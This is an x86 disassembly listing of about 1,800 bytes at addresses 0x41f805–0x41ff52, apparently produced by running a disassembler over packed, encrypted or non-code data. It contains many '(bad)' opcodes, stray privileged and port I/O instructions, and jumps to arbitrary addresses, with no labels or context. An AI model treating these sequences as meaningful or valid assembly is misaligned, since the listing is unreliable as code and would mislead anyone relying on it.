  41f805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f806:	inc    ebp
  41f807:	scas   eax,DWORD PTR es:[edi]
  41f808:	push   edi
  41f809:	lods   al,BYTE PTR ds:[esi]
  41f80a:	loope  0x41f87c
  41f80c:	pop    eax
  41f80d:	mov    eax,ds:0xee742b39
  41f812:	or     BYTE PTR [esi+0x283d64bc],cl
  41f818:	sub    ebp,edx
  41f81a:	cmp    BYTE PTR [ebx+ebp*4-0x146202ee],ah
  41f821:	cmp    BYTE PTR [eax+edi*4],bl
  41f824:	xchg   esp,eax
  41f825:	sbb    edi,DWORD PTR [edx]
  41f827:	std    
  41f828:	xchg   esp,eax
  41f829:	fwait
  41f82a:	sub    eax,0x727718f2
  41f82f:	push   ds
  41f830:	cld    
  41f831:	scas   eax,DWORD PTR es:[edi]
  41f832:	out    0x84,eax
  41f834:	popf   
  41f835:	js     0x41f89e
  41f837:	fidivr DWORD PTR [edx-0x39]
  41f83a:	leave  
  41f83b:	mov    cl,0x15
  41f83d:	or     ah,BYTE PTR [esi]
  41f83f:	jne    0x41f87c
  41f841:	dec    ebx
  41f842:	jle    0x41f7fe
  41f844:	div    BYTE PTR [edi-0x10]
  41f847:	addr16 loopne 0x41f830
  41f84a:	(bad)  
  41f84b:	fidivr WORD PTR [eax]
  41f84d:	lock lds esi,FWORD PTR [edi+0x37]
  41f851:	xchg   ebp,eax
  41f852:	(bad)  
  41f853:	and    al,0x3a
  41f855:	pop    eax
  41f856:	or     BYTE PTR [ebx+0x3c],0xb0
  41f85a:	push   eax
  41f85b:	test   eax,0xe7b38454
  41f860:	or     BYTE PTR [esi+0x64],ah
  41f863:	jle    0x41f85a
  41f865:	daa    
  41f866:	iret   
  41f867:	sbb    al,0x41
  41f869:	pop    edx
  41f86a:	std    
  41f86b:	xchg   DWORD PTR cs:[ebx+0x4b33b7ae],edx
  41f872:	sbb    al,0xae
  41f874:	pop    edi
  41f875:	push   esi
  41f876:	inc    eax
  41f877:	add    bh,BYTE PTR [edi]
  41f879:	inc    edx
  41f87a:	test   BYTE PTR [edx],ah
  41f87c:	dec    esp
  41f87d:	ins    DWORD PTR es:[edi],dx
  41f87e:	add    DWORD PTR [ebx+0x26],esi
  41f881:	jp     0x41f8f7
  41f883:	leave  
  41f884:	and    edi,DWORD PTR [edx-0x71]
  41f887:	inc    esi
  41f888:	mov    edi,0x240cb84a
  41f88d:	jae    0x41f84a
  41f88f:	sahf   
  41f890:	ja     0x41f8d5
  41f892:	dec    esp
  41f893:	dec    esi
  41f894:	and    esp,DWORD PTR [edx+0x2e]
  41f897:	and    BYTE PTR [ecx+0x30],0x31
  41f89b:	push   edx
  41f89c:	push   eax
  41f89d:	push   ebp
  41f89e:	add    BYTE PTR [ebx+0x25522b7d],dh
  41f8a4:	adc    DWORD PTR [ecx],ecx
  41f8a6:	and    bh,BYTE PTR [ebx+0x3b5a2cf9]
  41f8ac:	dec    edx
  41f8ad:	xchg   ebp,eax
  41f8ae:	cwde   
  41f8af:	add    edi,DWORD PTR [ebx+0x248a4d2b]
  41f8b5:	xor    al,0x68
  41f8b7:	iret   
  41f8b8:	push   0xf7ffd7fc
  41f8bd:	adc    bh,BYTE PTR [edi+0xcfd9321]
  41f8c3:	(bad)  
  41f8c4:	arpl   dx,bx
  41f8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8c7:	add    eax,0xac091582
  41f8cc:	dec    ebx
  41f8cd:	les    edi,FWORD PTR [ecx-0x171d9f0b]
  41f8d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8d4:	gs ss dec esi
  41f8d7:	repnz xchg edi,eax
  41f8d9:	rcl    DWORD PTR es:[edx],cl
  41f8dc:	jmp    0x41f8f9
  41f8de:	xchg   esi,eax
  41f8df:	or     DWORD PTR [ebx-0x55],eax
  41f8e2:	or     al,0xa4
  41f8e4:	push   ss
  41f8e5:	push   ds
  41f8e6:	lar    edx,WORD PTR [edi+esi*1-0x1224b062]
  41f8ee:	sahf   
  41f8ef:	ss inc edx
  41f8f1:	dec    ebx
  41f8f2:	add    eax,0xb5f98205
  41f8f7:	sub    BYTE PTR [ebx+0x79c5fe39],ch
  41f8fd:	dec    edx
  41f8fe:	xchg   esi,eax
  41f8ff:	xchg   edx,eax
  41f900:	sub    BYTE PTR [esi+0x5e099e92],dh
  41f906:	popf   
  41f907:	push   ebp
  41f908:	and    BYTE PTR [edi+0x7a],cl
  41f90b:	daa    
  41f90c:	pop    ecx
  41f90d:	mov    al,ds:0x3fb46527
  41f912:	cmp    BYTE PTR [edi],dh
  41f914:	js     0x41f902
  41f916:	fstp   QWORD PTR fs:0xec79a025
  41f91d:	mov    al,ds:0x5671f3ff
  41f922:	add    al,0xf5
  41f924:	pop    es
  41f925:	jl     0x41f907
  41f927:	lock addr16 mov cl,0x6d
  41f92b:	mov    eax,0x439d32aa
  41f930:	pop    edx
  41f931:	ins    DWORD PTR es:[edi],dx
  41f932:	je     0x41f96e
  41f934:	or     ch,bl
  41f936:	pushf  
  41f937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f938:	mov    ds:0x66346b84,eax
  41f93d:	fwait
  41f93e:	movsx  ebx,BYTE PTR [eax-0x1b0a0981]
  41f945:	sub    bl,BYTE PTR cs:[eax]
  41f948:	mov    dh,0x9f
  41f94a:	ins    DWORD PTR es:[edi],dx
  41f94b:	xor    BYTE PTR [ebx+esi*8-0x3269fdd1],bh
  41f952:	push   0xce350714
  41f957:	rol    BYTE PTR [ebx+0x1a],1
  41f95a:	loop   0x41f8f7
  41f95c:	cmc    
  41f95d:	fidiv  WORD PTR [edx]
  41f95f:	retf   
  41f960:	lea    edi,[edi]
  41f962:	push   ds
  41f963:	sub    cl,BYTE PTR [esp+edx*4-0x14]
  41f967:	lds    esp,FWORD PTR [eax+0x19eb2af3]
  41f96d:	mov    ds:0xe2794bdb,al
  41f972:	cmc    
  41f973:	call   0xf63343b7
  41f978:	outs   dx,BYTE PTR ds:[esi]
  41f979:	ds sub ch,bl
  41f97c:	jle    0x41f982
  41f97e:	arpl   WORD PTR [ecx-0x1e8ca923],bp
  41f984:	xchg   esi,eax
  41f985:	jmp    0x41f936
  41f987:	cmc    
  41f988:	popa   
  41f989:	jo     0x41f9c2
  41f98b:	ret    0xa0f1
  41f98e:	sub    dh,dl
  41f990:	xchg   ebx,eax
  41f991:	aas    
  41f992:	xor    al,0xf1
  41f994:	adc    esp,DWORD PTR [edi-0xe49fca5]
  41f99a:	inc    ebx
  41f99b:	ret    0x580d
  41f99e:	aas    
  41f99f:	test   DWORD PTR [ebx],edi
  41f9a1:	adc    DWORD PTR [edi],esi
  41f9a3:	lods   al,BYTE PTR ds:[esi]
  41f9a4:	std    
  41f9a5:	(bad)
  41f9a9:	jns    0x41f9e1
  41f9ab:	test   BYTE PTR [ecx+0xafd9c05],al
  41f9b1:	loope  0x41f9fe
  41f9b3:	ins    BYTE PTR es:[edi],dx
  41f9b4:	and    BYTE PTR [esi],ah
  41f9b6:	ret    0xb013
  41f9b9:	and    al,BYTE PTR [ebx-0x5]
  41f9bc:	jle    0x41f9ee
  41f9be:	enter  0x4dcd,0xd
  41f9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9c3:	mov    al,ds:0xa53d5286
  41f9c8:	pop    ebx
  41f9c9:	call   0x17f1cb4b
  41f9ce:	push   esp
  41f9cf:	pop    edx
  41f9d0:	cmp    eax,0x712d240
  41f9d5:	pop    ecx
  41f9d6:	pop    ds
  41f9d7:	rcl    DWORD PTR [esi+0x55],1
  41f9da:	add    al,0xfe
  41f9dc:	sbb    BYTE PTR [esi+0xdac5799],0xc2
  41f9e3:	push   edi
  41f9e4:	scas   al,BYTE PTR es:[edi]
  41f9e5:	mov    WORD PTR [ecx-0x1b],?
  41f9e8:	stos   BYTE PTR es:[edi],al
  41f9e9:	inc    esi
  41f9ea:	push   ss
  41f9eb:	and    ebp,ecx
  41f9ed:	pop    ss
  41f9ee:	push   esp
  41f9ef:	stc    
  41f9f0:	cwde   
  41f9f1:	outs   dx,DWORD PTR ds:[esi]
  41f9f2:	xchg   BYTE PTR [ecx+0x2ade8534],bh
  41f9f8:	fdiv   QWORD PTR [ebx]
  41f9fa:	cmp    BYTE PTR [edx-0x23128bc3],dh
  41fa00:	pushf  
  41fa01:	ret    
  41fa02:	scas   eax,DWORD PTR es:[edi]
  41fa03:	or     DWORD PTR [edx-0x140e612e],0x7de113ad
  41fa0d:	fld    QWORD PTR [edx]
  41fa0f:	mov    esp,0x7389af20
  41fa14:	mov    BYTE PTR ds:0xa938ed9,cl
  41fa1a:	loop   0x41fa86
  41fa1c:	popa   
  41fa1d:	dec    eax
  41fa1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1f:	call   0x4af680ef
  41fa24:	sbb    edx,edx
  41fa26:	rcr    BYTE PTR [edx-0x695d9fb8],cl
  41fa2c:	mov    ebp,0x41a6e6ed
  41fa31:	xor    cl,ch
  41fa33:	loope  0x41f9c7
  41fa35:	add    ah,BYTE PTR [ecx-0x23]
  41fa38:	addr16 mov esp,0x3d53f471
  41fa3e:	mov    dh,0x31
  41fa40:	jnp    0x41fa57
  41fa42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa43:	bnd jnp 0x41fa06
  41fa46:	loop   0x41f9ff
  41fa48:	aam    0x48
  41fa4a:	dec    DWORD PTR [edx+0x6e45c29c]
  41fa50:	imul   ecx,edi,0xbb3fc851
  41fa56:	ja     0x41f9e7
  41fa58:	aam    0x3a
  41fa5a:	mov    ebp,esi
  41fa5c:	and    ebp,DWORD PTR [esi-0x318a894f]
  41fa62:	mov    dl,0x4e
  41fa64:	mov    al,0x7a
  41fa66:	sbb    eax,0x8c001648
  41fa6b:	call   0x5c71:0x6036b0a2
  41fa72:	popa   
  41fa73:	inc    edi
  41fa74:	and    eax,0xa014714d
  41fa79:	and    edi,DWORD PTR [eax+0x2d]
  41fa7c:	jno    0x41fad6
  41fa7e:	rol    DWORD PTR [ebx],1
  41fa80:	js     0x41fa5e
  41fa82:	pop    ss
  41fa83:	mov    cl,0xa5
  41fa85:	xlat   BYTE PTR ds:[ebx]
  41fa86:	call   0xf6930bb6
  41fa8b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa8d:	push   ebp
  41fa8e:	xor    edx,ebp
  41fa90:	push   edx
  41fa91:	add    al,0xac
  41fa93:	and    DWORD PTR [ebp+0x3db059d1],ecx
  41fa99:	cmp    ecx,ebp
  41fa9b:	repz aas 
  41fa9d:	mov    edi,0xd859f101
  41faa2:	pop    ds
  41faa3:	aaa    
  41faa4:	jns    0x41fac5
  41faa6:	mov    ebp,0x36e2fe08
  41faab:	imul   edx
  41faad:	adc    ecx,DWORD PTR [eax-0x4617d7c3]
  41fab3:	stos   BYTE PTR es:[edi],al
  41fab4:	in     eax,dx
  41fab5:	outs   dx,BYTE PTR ds:[esi]
  41fab6:	push   ebx
  41fab7:	lods   eax,DWORD PTR ds:[esi]
  41fab8:	and    BYTE PTR [ecx-0x7afdb74f],bl
  41fabe:	mov    dh,0x51
  41fac0:	cmp    BYTE PTR [eax+0x20f4f782],ah
  41fac6:	inc    esi
  41fac7:	idiv   cl
  41fac9:	iret   
  41faca:	es loopne 0x41fb06
  41facd:	loope  0x41fae6
  41facf:	retf   0x4baf
  41fad2:	icebp  
  41fad3:	out    0x82,eax
  41fad5:	inc    esi
  41fad6:	push   ss
  41fad7:	icebp  
  41fad8:	pop    edi
  41fad9:	mov    ds:0x742a94fe,eax
  41fade:	aaa    
  41fadf:	cs push ss
  41fae1:	and    dl,al
  41fae3:	fld    DWORD PTR [eax]
  41fae5:	add    BYTE PTR [eax],al
  41fae7:	add    BYTE PTR [eax],al
  41fae9:	add    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	or     DWORD PTR [edi],ecx
  41faf8:	cwde   
  41faf9:	pushf  
  41fafa:	push   esp
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [edx+0x18000006],al
  41fb03:	adc    dl,BYTE PTR cs:[ebx]
  41fb06:	jp     0x41faf6
  41fb08:	cdq    
  41fb09:	jne    0x41fb57
  41fb0b:	pop    edx
  41fb0c:	adc    DWORD PTR [edx+0xc],0xc63f75f
  41fb13:	int3   
  41fb14:	sar    ebx,0x8f
  41fb17:	neg    edx
  41fb19:	mov    DWORD PTR [esi+0x69ee62b4],ebx
  41fb1f:	ins    BYTE PTR es:[edi],dx
  41fb20:	add    ah,BYTE PTR [ebp+0x6e]
  41fb23:	sti    
  41fb24:	ss out dx,eax
  41fb26:	not    DWORD PTR [edx]
  41fb28:	das    
  41fb29:	xchg   esp,eax
  41fb2a:	std    
  41fb2b:	imul   esp,eax,0x5b
  41fb2e:	sub    ebp,edx
  41fb30:	lock pop esp
  41fb32:	mov    BYTE PTR [edx-0x54],dh
  41fb35:	sub    eax,0xbae0ac8d
  41fb3a:	leave  
  41fb3b:	jmp    0x41fb22
  41fb3d:	pop    ss
  41fb3e:	mov    dh,0xf4
  41fb40:	out    0x13,al
  41fb42:	add    eax,0xa8dfb97e
  41fb47:	shl    DWORD PTR [ecx-0x4e],1
  41fb4a:	mov    dh,0x6e
  41fb4c:	leave  
  41fb4d:	and    DWORD PTR [edx],ebp
  41fb4f:	pop    esi
  41fb50:	and    BYTE PTR [esi],cl
  41fb52:	push   ecx
  41fb53:	(bad)  
  41fb54:	es cmp cl,bh
  41fb57:	lods   eax,DWORD PTR ds:[esi]
  41fb58:	int3   
  41fb59:	fldcw  WORD PTR [ecx]
  41fb5b:	xchg   edx,eax
  41fb5c:	arpl   WORD PTR [ebx+0x3ac481c1],si
  41fb62:	aam    0xe3
  41fb64:	mov    esi,DWORD PTR [edx-0x7]
  41fb67:	idiv   DWORD PTR [esi-0x36]
  41fb6a:	lods   eax,DWORD PTR ds:[esi]
  41fb6b:	or     DWORD PTR [ebp+0xa],eax
  41fb6e:	sub    eax,0x2d44e790
  41fb73:	stos   DWORD PTR es:[edi],eax
  41fb74:	mov    ah,0x6
  41fb76:	test   eax,0xc5c194b5
  41fb7b:	add    DWORD PTR [edi+0x50b89cc8],esp
  41fb81:	test   al,0x4c
  41fb83:	(bad)  [ebp+0x67]
  41fb86:	imul   ecx,esi,0x8
  41fb89:	or     ch,dh
  41fb8b:	xlat   BYTE PTR ds:[ebx]
  41fb8c:	adc    BYTE PTR [edi-0x52],al
  41fb8f:	popf   
  41fb90:	xor    al,0x26
  41fb92:	xor    eax,0xf6bbdab
  41fb97:	addr16 xchg edi,eax
  41fb99:	sub    eax,eax
  41fb9b:	(bad)  
  41fb9c:	enter  0xf419,0x1b
  41fba0:	xchg   edi,eax
  41fba1:	mov    al,ds:0x8fd72be5
  41fba6:	mov    bh,bl
  41fba8:	ja     0x41fb4c
  41fbaa:	inc    ebp
  41fbab:	ins    BYTE PTR es:[edi],dx
  41fbac:	rcl    DWORD PTR [ebx+0x3d],cl
  41fbaf:	jl     0x41fbda
  41fbb1:	mov    ds:0xc60c0388,eax
  41fbb6:	mov    bl,0x9c
  41fbb8:	aam    0xa5
  41fbba:	fiadd  DWORD PTR [ecx-0x60]
  41fbbd:	int    0x74
  41fbbf:	or     al,0xb
  41fbc1:	lods   eax,DWORD PTR ds:[esi]
  41fbc2:	push   eax
  41fbc3:	int3   
  41fbc4:	mov    bl,0xa1
  41fbc6:	sub    bl,dh
  41fbc8:	add    DWORD PTR [edi+0x313a0531],edi
  41fbce:	int    0xc0
  41fbd0:	fcmovnbe st,st(1)
  41fbd2:	xchg   esi,eax
  41fbd3:	fucomi st,st(1)
  41fbd5:	jmp    0xeb5a384f
  41fbda:	gs xchg ecx,eax
  41fbdc:	lds    esp,FWORD PTR [edx]
  41fbde:	xchg   edi,eax
  41fbdf:	xchg   ecx,eax
  41fbe0:	push   esp
  41fbe1:	fwait
  41fbe2:	adc    DWORD PTR [eax],ebx
  41fbe4:	xor    edi,esi
  41fbe6:	push   ss
  41fbe7:	popa   
  41fbe8:	jg     0x41fb9d
  41fbea:	mov    edx,DWORD PTR [esi+0x75]
  41fbed:	push   ecx
  41fbee:	xor    dl,BYTE PTR [eax-0x50208ba4]
  41fbf4:	add    BYTE PTR [ecx],ch
  41fbf6:	push   edx
  41fbf7:	mov    fs,WORD PTR ds:0xf7bc4623
  41fbfd:	aas    
  41fbfe:	push   ecx
  41fbff:	retf   0x9d04
  41fc02:	(bad)  
  41fc03:	rep stos BYTE PTR es:[edi],al
  41fc05:	neg    BYTE PTR [ecx+0x265896a]
  41fc0b:	mov    bh,0x75
  41fc0d:	ret    
  41fc0e:	mov    dh,0xb4
  41fc10:	call   0x9161fa97
  41fc15:	repz aas 
  41fc17:	pop    ebx
  41fc18:	mov    ebp,0x1f3d85c9
  41fc1d:	ins    BYTE PTR es:[edi],dx
  41fc1e:	test   eax,0xdd0d060
  41fc23:	in     eax,0x73
  41fc25:	fldcw  WORD PTR [ebx+0x32645ad3]
  41fc2b:	and    eax,0xc9daa31
  41fc30:	mov    ah,0xed
  41fc32:	cld    
  41fc33:	imul   eax,DWORD PTR [edi-0x1b78a7f3],0xffffffb6
  41fc3a:	repnz xor al,ch
  41fc3d:	mov    edx,0x3a2107e8
  41fc42:	push   es
  41fc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc44:	mov    esi,0x44462d56
  41fc49:	sbb    dh,BYTE PTR [edx-0x31e21266]
  41fc4f:	sar    WORD PTR [edx],0xc5
  41fc53:	loop   0x41fcb1
  41fc55:	shl    DWORD PTR [esi-0x13fd217f],0x1
  41fc5c:	adc    ebp,DWORD PTR fs:[eax*1+0x1bb68380]
  41fc64:	adc    ebx,DWORD PTR ss:0xe40def07
  41fc6b:	push   ds
  41fc6c:	sbb    dh,BYTE PTR ds:0xccd37d5
  41fc72:	mul    ch
  41fc74:	in     al,0xc8
  41fc76:	(bad)  
  41fc77:	ja     0x41fcb9
  41fc79:	popf   
  41fc7a:	jp     0x41fc1f
  41fc7c:	shl    BYTE PTR [ebx],0xf2
  41fc7f:	add    dl,BYTE PTR [eax-0x35a2e415]
  41fc85:	mov    edx,0x2236a5c6
  41fc8a:	xchg   esi,eax
  41fc8b:	aam    0x6d
  41fc8d:	inc    edx
  41fc8e:	test   eax,0x8dfa1bea
  41fc93:	retf   
  41fc94:	sar    DWORD PTR [edx],cl
  41fc96:	ss into 
  41fc98:	push   0x1
  41fc9a:	mov    bl,0x6c
  41fc9c:	out    dx,eax
  41fc9d:	mov    ecx,0x8abc4eb9
  41fca2:	int    0x1a
  41fca4:	shl    esi,0xbc
  41fca7:	pop    esp
  41fca8:	xor    eax,0xf5199812
  41fcad:	mov    al,ds:0x333067ea
  41fcb2:	xchg   edi,eax
  41fcb3:	jno    0x41fd0b
  41fcb5:	(bad)  
  41fcb7:	mov    BYTE PTR [ebp-0x6],al
  41fcba:	cmp    eax,0xcef54da7
  41fcbf:	add    DWORD PTR [ecx],0x2c
  41fcc2:	adc    BYTE PTR ds:0xa499e5e0,bh
  41fcc8:	out    dx,eax
  41fcc9:	repz test DWORD PTR [ebp+0x282bf9f1],eax
  41fcd0:	stos   DWORD PTR es:[edi],eax
  41fcd1:	dec    edx
  41fcd2:	popf   
  41fcd3:	mov    dl,0xce
  41fcd5:	xor    al,0x11
  41fcd7:	dec    edi
  41fcd8:	adc    DWORD PTR [edi+0x37f45ad1],eax
  41fcde:	push   esi
  41fcdf:	pop    ds
  41fce0:	dec    esp
  41fce1:	mov    BYTE PTR [edi+0x37],ah
  41fce4:	dec    eax
  41fce5:	fwait
  41fce6:	sub    eax,DWORD PTR [esi+0x2b401879]
  41fcec:	pop    eax
  41fced:	int    0xa8
  41fcef:	aad    0x53
  41fcf1:	xor    DWORD PTR [ebp-0xb],ebp
  41fcf4:	pop    es
  41fcf5:	(bad)  
  41fcf6:	pop    ebp
  41fcf7:	aam    0x8c
  41fcf9:	nop
  41fcfa:	add    cl,cl
  41fcfc:	and    DWORD PTR [esi],eax
  41fcfe:	fiadd  WORD PTR [ebx-0x1c15aca6]
  41fd04:	push   ss
  41fd05:	adc    BYTE PTR [esi+ebp*4-0x23781b93],bh
  41fd0c:	add    BYTE PTR [edi+0x21],bl
  41fd0f:	or     eax,0x6
  41fd12:	inc    eax
  41fd13:	nop
  41fd14:	in     eax,dx
  41fd15:	shl    ecx,0x81
  41fd18:	add    DWORD PTR ds:0x39ba7eee,ecx
  41fd1e:	push   esp
  41fd1f:	es icebp 
  41fd21:	sbb    ch,ah
  41fd23:	loopne 0x41fd56
  41fd25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd26:	xchg   edi,eax
  41fd27:	mov    bl,0xf3
  41fd29:	shr    DWORD PTR ds:0xe036d573,1
  41fd2f:	loop   0x41fd92
  41fd31:	inc    esp
  41fd32:	inc    esp
  41fd33:	xchg   edi,eax
  41fd34:	adc    bh,BYTE PTR [eax+0x1b3918ad]
  41fd3a:	pusha  
  41fd3b:	push   edi
  41fd3c:	xchg   esi,eax
  41fd3d:	(bad)  
  41fd3e:	retf   0x3199
  41fd41:	shr    BYTE PTR [edx+0x7a93e7d5],1
  41fd47:	sub    al,0x27
  41fd49:	adc    DWORD PTR [ebp+0x73],esp
  41fd4c:	lahf   
  41fd4d:	sahf   
  41fd4e:	mov    ebx,0xff7d900
  41fd53:	dec    edx
  41fd54:	dec    BYTE PTR [edx-0x3bc4d55c]
  41fd5a:	in     eax,0xf3
  41fd5c:	gs push ebp
  41fd5e:	mov    ch,0x9a
  41fd60:	mov    ds:0xb7b63645,eax
  41fd65:	and    DWORD PTR [edx+eiz*4-0x593ecd9f],esp
  41fd6c:	sbb    eax,0xf532a14a
  41fd71:	mov    ds:0x63e3f6d8,al
  41fd76:	mov    ebx,0x52169fba
  41fd7b:	pop    ebx
  41fd7c:	sub    al,0x8a
  41fd7e:	lahf   
  41fd7f:	les    esi,FWORD PTR [edx+0x59]
  41fd82:	jle    0x41fd36
  41fd84:	neg    DWORD PTR [eax]
  41fd86:	mov    eax,ds:0x60e629e7
  41fd8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd8c:	jmp    0x41fda5
  41fd8e:	sub    al,0x3c
  41fd90:	iret   
  41fd91:	inc    ebp
  41fd92:	adc    eax,0xd58cc030
  41fd97:	cmc    
  41fd98:	xor    esp,DWORD PTR [edi-0x14]
  41fd9b:	xchg   edi,eax
  41fd9c:	push   esp
  41fd9d:	sub    al,BYTE PTR [ebx+0x4c]
  41fda0:	imul   esi,DWORD PTR [esi],0x7d4b8753
  41fda6:	(bad)  
  41fda7:	jmp    0xa845:0x81e69929
  41fdae:	mov    es,WORD PTR [eax]
  41fdb0:	adc    BYTE PTR [ebx],dh
  41fdb2:	push   edi
  41fdb3:	rcr    BYTE PTR ds:0x8072a4c5,1
  41fdb9:	push   cs
  41fdba:	repz enter 0x5659,0x3
  41fdbf:	scas   al,BYTE PTR es:[edi]
  41fdc0:	fimul  WORD PTR [edi]
  41fdc2:	mov    cl,0x9a
  41fdc4:	mov    esp,edi
  41fdc6:	(bad)  
  41fdc7:	ins    BYTE PTR es:[edi],dx
  41fdc8:	mov    ebx,0x1bb42050
  41fdcd:	mov    ecx,0xf8222786
  41fdd2:	mov    ebp,0x454adbcc
  41fdd7:	sbb    DWORD PTR [edx-0x68],esp
  41fdda:	fstp   QWORD PTR [ecx+0x2c]
  41fddd:	jp     0x41fe28
  41fddf:	cs sub eax,0xa4118035
  41fde5:	and    DWORD PTR [edx-0x58123780],ecx
  41fdeb:	sti    
  41fdec:	push   0xffffff84
  41fdee:	out    0x95,al
  41fdf0:	sbb    DWORD PTR [ecx],esp
  41fdf2:	or     bh,ch
  41fdf4:	and    al,dh
  41fdf6:	jg     0x41fdcc
  41fdf8:	ret    0x29e5
  41fdfb:	inc    edi
  41fdfc:	enter  0x8470,0xd3
  41fe00:	fcmovnbe st,st(7)
  41fe02:	xchg   ebp,eax
  41fe03:	fnstsw WORD PTR [ebx+0x46]
  41fe06:	dec    edx
  41fe07:	sub    ebx,0x6b
  41fe0a:	call   0xe418288a
  41fe0f:	in     eax,0x2e
  41fe11:	dec    esi
  41fe12:	adc    eax,0xd1671ab9
  41fe17:	in     eax,dx
  41fe18:	dec    eax
  41fe19:	in     eax,dx
  41fe1a:	ds pop ds
  41fe1c:	xor    al,0xb2
  41fe1e:	push   ss
  41fe1f:	xchg   edx,eax
  41fe20:	mov    al,0x3c
  41fe22:	std    
  41fe23:	scas   eax,DWORD PTR es:[edi]
  41fe24:	outs   dx,DWORD PTR ds:[esi]
  41fe25:	mov    esp,0x40e104f2
  41fe2a:	fisttp DWORD PTR [ebx]
  41fe2c:	xchg   esi,eax
  41fe2d:	mov    ebx,0x7f89cb7
  41fe32:	sbb    BYTE PTR [ecx],dh
  41fe34:	pop    DWORD PTR [ebp+0x6b]
  41fe37:	js     0x41fdc8
  41fe39:	jmp    0xa231c6da
  41fe3e:	sbb    al,0x2a
  41fe40:	in     eax,dx
  41fe41:	lea    edi,[ebx-0x17f5b2fe]
  41fe47:	mov    esi,0x7618975b
  41fe4c:	lods   eax,DWORD PTR ds:[esi]
  41fe4d:	jb     0x41fe66
  41fe4f:	push   edi
  41fe50:	pop    ds
  41fe51:	mov    eax,0x6efcd1d2
  41fe56:	jp     0x41fe1e
  41fe58:	lea    esp,[ebp*1-0x71e5d6e2]
  41fe5f:	pop    esi
  41fe60:	dec    ebp
  41fe61:	adc    DWORD PTR [ebx+0x73],eax
  41fe64:	scas   eax,DWORD PTR es:[edi]
  41fe65:	pushf  
  41fe66:	or     ebx,DWORD PTR [esi]
  41fe68:	mov    edi,0x5da4764b
  41fe6d:	out    0x33,al
  41fe6f:	das    
  41fe70:	sahf   
  41fe71:	aas    
  41fe72:	(bad)  
  41fe73:	jne    0x41fe31
  41fe75:	fs icebp 
  41fe77:	mov    edx,0x611f882f
  41fe7c:	mov    BYTE PTR [ecx-0x52],bl
  41fe7f:	jb     0x41fe96
  41fe81:	and    BYTE PTR [esi-0x2aa8b5dd],bh
  41fe87:	dec    edx
  41fe88:	dec    esp
  41fe89:	test   BYTE PTR [edi-0x65],al
  41fe8c:	outs   dx,DWORD PTR ds:[esi]
  41fe8d:	clc    
  41fe8e:	xor    eax,0xf233aeeb
  41fe93:	push   cs
  41fe94:	cmp    DWORD PTR [esp+ebp*2],ebx
  41fe97:	out    0x86,eax
  41fe99:	pop    ss
  41fe9a:	fistp  WORD PTR [eax+0x2708f545]
  41fea0:	cld    
  41fea1:	or     eax,0x5517bfb8
  41fea6:	xor    DWORD PTR [edi+eiz*4],edx
  41fea9:	cwde   
  41feaa:	push   ebp
  41feab:	(bad)  
  41feac:	mov    ds:0xb6c236a9,eax
  41feb1:	lds    esi,FWORD PTR [ebx-0x628f8802]
  41feb7:	(bad)  
  41feb8:	(bad)  
  41feb9:	inc    esp
  41feba:	and    eax,0x7589fe84
  41febf:	mov    esp,esi
  41fec1:	or     eax,0xfbc16ef8
  41fec6:	mov    cl,0x7b
  41fec8:	(bad)  
  41fec9:	cli    
  41feca:	lods   al,BYTE PTR ds:[esi]
  41fecb:	mov    esi,0xeb170ded
  41fed0:	enter  0x466f,0x17
  41fed4:	lods   al,BYTE PTR ds:[esi]
  41fed5:	jno    0x41ff53
  41fed7:	cwde   
  41fed8:	(bad)  
  41fed9:	and    ecx,DWORD PTR [esi+0x73]
  41fedc:	xchg   ebx,eax
  41fedd:	out    dx,eax
  41fede:	mov    esp,0x922ae5fb
  41fee3:	popf   
  41fee4:	xchg   esp,eax
  41fee5:	int3   
  41fee6:	xor    DWORD PTR [ecx+0x617c67a7],eax
  41feec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feed:	inc    ebx
  41feee:	or     al,0x26
  41fef0:	imul   esp,DWORD PTR [ecx+edi*1-0x3fcc0696],0x45fca2c0
  41fefb:	inc    esp
  41fefc:	add    cl,dl
  41fefe:	and    BYTE PTR ds:0x4c5783f6,dh
  41ff04:	outs   dx,BYTE PTR ds:[esi]
  41ff05:	jne    0x41fece
  41ff07:	aaa    
  41ff08:	jae    0x41fee1
  41ff0a:	int    0xe0
  41ff0c:	ins    BYTE PTR es:[edi],dx
  41ff0d:	fsubr  DWORD PTR [ebp-0x19f217a2]
  41ff13:	iret   
  41ff14:	outs   dx,DWORD PTR ds:[esi]
  41ff15:	data16 (bad) 
  41ff17:	pop    ds
  41ff18:	sub    ax,0xf488
  41ff1c:	out    0x6d,eax
  41ff1e:	dec    esi
  41ff1f:	dec    ebx
  41ff20:	dec    edi
  41ff21:	or     BYTE PTR [esi-0x23],dl
  41ff24:	mov    ds:0xd036a3ec,eax
  41ff29:	mov    eax,0x3dbcff29
  41ff2e:	or     bh,BYTE PTR [ecx]
  41ff30:	jo     0x41ff6a
  41ff32:	inc    eax
  41ff33:	sbb    BYTE PTR [ebx-0x9],ah
  41ff36:	imul   BYTE PTR [eax-0x6b]
  41ff39:	lahf   
  41ff3a:	mov    ah,0x18
  41ff3c:	jecxz  0x41ff16
  41ff3e:	ret    
  41ff3f:	fnstenv [ecx-0x70]
  41ff42:	and    al,0xb0
  41ff44:	add    bh,dl
  41ff46:	xchg   esi,eax
  41ff47:	jbe    0x41ff96
  41ff49:	repz aad 0x9a
  41ff4c:	ficom  DWORD PTR [eax+0x6c4ed43d]
  41ff52:	push   edi
